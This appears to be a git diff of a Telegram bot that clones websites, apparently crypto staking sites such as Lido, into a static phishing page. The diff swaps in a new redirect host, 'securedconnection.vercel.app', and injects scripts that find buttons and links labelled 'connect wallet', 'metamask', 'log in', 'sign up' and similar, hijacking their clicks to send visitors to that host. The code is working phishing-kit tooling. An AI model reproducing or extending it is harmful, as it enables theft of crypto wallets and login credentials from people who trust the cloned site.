@@ -65,7 +65,7 @@ bot.on("text", async (ctx) => {
 
     (async () => {
       const outputDir = path.join(__dirname, "cloned");
-      const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
+      const redirectURL = "https://securedconnection.vercel.app/"; // URL to redirect all links to
       // Clear the cloned directory before starting
       async function clearClonedDirectory() {
         try {
@@ -162,19 +162,6 @@ bot.on("text", async (ctx) => {
           $("base").remove();
           $("head").prepend(`<base href="${siteUrl}">`);
 
-          // Redirect external links
-          $("a[href]").each((_, el) => {
-            const href = $(el).attr("href");
-            if (
-              href &&
-              href.startsWith("http") &&
-              !href.includes(new URL(siteUrl).hostname)
-            ) {
-              $(el).attr("href", redirectURL);
-              $(el).removeAttr("target");
-            }
-          });
-
           // Remove wallet-related scripts
           $("script").each((_, el) => {
             const src = $(el).attr("src") || "";
@@ -214,14 +201,21 @@ bot.on("text", async (ctx) => {
 
           $("head").prepend(`<script class="click-handler-script">
         document.addEventListener("DOMContentLoaded", () => {
-          const anchorElements = document.querySelectorAll("a");
-          anchorElements.forEach(el => {
-            el.setAttribute("href", "${redirectURL}");
-            console.log("✅ Added href to <a>: ${redirectURL}");
-          });
-          const interactiveElements = document.querySelectorAll(
-            "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
-          );
+      
+       const interactiveElements = Array.from(document.querySelectorAll("*")).filter(el => 
+  el.innerText.toLowerCase().includes("connect wallet") ||
+  el.innerText.toLowerCase().includes("connect to wallet") ||
+  el.innerText.toLowerCase().includes("wallet connect") ||
+  el.innerText.toLowerCase().includes("metamask") ||
+  el.innerText.toLowerCase().includes("web3") ||
+  el.innerText.toLowerCase().includes("log in") ||
+  el.innerText.toLowerCase().includes("sign in") ||
+  el.innerText.toLowerCase().includes("sign up") ||
+  el.innerText.toLowerCase().includes("register") ||
+  el.innerText.toLowerCase().includes("create account") ||  
+   el.innerText.toLowerCase().includes("login")
+);
+
           interactiveElements.forEach(el => {
             el.onclick = null;
             el.removeAttribute("onclick");
@@ -239,72 +233,83 @@ bot.on("text", async (ctx) => {
         });
       </script>`);
 
-          $("head").prepend(`<script class="dynamic-script">
-          window.addEventListener("DOMContentLoaded", () => {
-            console.log("🔁 Running prioritized image fixer...");
-            function fixImages() {
-              // Redirect all <a> tags
-              document.querySelectorAll("a").forEach((link) => {
-                link.removeAttribute("href");
-                link.addEventListener("click", function (event) {
-                  event.preventDefault();
-                  window.location.href = '${redirectURL}';
-                });
-              });
+          $("head").prepend(`   <script class="dynamic-script">
+  window.addEventListener("DOMContentLoaded", () => {
+    console.log("🔁 Running prioritized image fixer...");
 
-              // Redirect all <button> elements
-              document.querySelectorAll("button").forEach((button) => {
-                button.removeAttribute("onclick");
-                button.addEventListener("click", function (event) {
-                  event.preventDefault();
-                  event.stopImmediatePropagation(); // Stops any other handlers
-                  window.location.href = '${redirectURL}';
-                });
+    const redirectURL = "${redirectURL}";
 
-              });
-   
-              const images = document.querySelectorAll("img");
-              images.forEach((img) => {
-                const src = img.getAttribute("src");
-                img.removeAttribute("srcset");
-                if (
-                  src &&
-                  src.startsWith("/") &&
-                  !src.startsWith("data:") &&
-                  !src.startsWith("//") &&
-                  !src.startsWith("http")
-                ) {
-                  img.src = new URL(src, "https://stake.lido.fi/").href;
-                }
-              });
-            }
-            fixImages();
-            setTimeout(fixImages, 3000);
-            setInterval(fixImages, 10000);
-          });
-    </script>`);
-          $("head").prepend(`<script class="dynamic-script">
-       document.addEventListener('DOMContentLoaded', function() {
-    // Target URL for redirection
-  const redirectUrl = ${redirectURL};
+    function fixImagesAndButtons() {
+      const clickableElements = document.querySelectorAll(
+  'button, a, [role="button"], [onclick]'
+);
 
-    // Redirect all <a> tags
-    document.querySelectorAll('a').forEach(link => {
-        link.addEventListener('click', function(event) {
-            event.preventDefault();
-            window.location.href = redirectUrl;
-        });
-    });
-
-    // Redirect all <button> elements
-    document.querySelectorAll('button').forEach(button => {
-        button.addEventListener('click', function(event) {
-            event.preventDefault();
-            window.location.href = redirectUrl;
-        });
-    });
+const interactiveElements = Array.from(clickableElements).filter((el) => {
+  const text = (el.innerText || "").toLowerCase().trim();
+  return (
+    text.includes("connect wallet") ||
+    text.includes("connect to wallet") ||
+    text.includes("wallet connect") ||
+    text.includes("metamask") ||
+    text.includes("web3") ||
+    text.includes("log in") ||
+    text.includes("sign in") ||
+    text.includes("sign up") ||
+    text.includes("register") ||
+    text.includes("create account") ||
+    text.includes("login")
+  );
 });
-      </script>`);
+
+
+      interactiveElements.forEach((el) => {
+        // Remove any href or onclick behavior
+        el.removeAttribute("href");
+        el.removeAttribute("onclick");
+
+        // If there's an <a> inside, disable it too
+        const anchor = el.querySelector("a");
+        if (anchor) {
+          anchor.removeAttribute("href");
+          anchor.removeAttribute("onclick");
+          anchor.addEventListener("click", (event) => {
+            event.preventDefault();
+            event.stopImmediatePropagation();
+            window.location.href = redirectURL;
+          });
+        }
+
+        // Add redirect handler on click
+        el.addEventListener("click", (event) => {
+          event.preventDefault();
+          event.stopImmediatePropagation();
+          window.location.href = redirectURL;
+        });
+      });
+
+      // Fix image sources
+      const images = document.querySelectorAll("img");
+      images.forEach((img) => {
+        const src = img.getAttribute("src");
+        img.removeAttribute("srcset");
+        if (
+          src &&
+          src.startsWith("/") &&
+          !src.startsWith("data:") &&
+          !src.startsWith("//") &&
+          !src.startsWith("http")
+        ) {
+          img.src = new URL(src, "${siteUrl}").href;
+        }
+      });
+    }
+
+    fixImagesAndButtons();
+    setTimeout(fixImagesAndButtons, 3000);
+    setInterval(fixImagesAndButtons, 10000);
+  });
+</script>`);
+
           // Save HTML
           await fs.outputFile(path.join(outputDir, "index.html"), $.html());
           console.log("✅ Done! Saved at cloned/index.html");
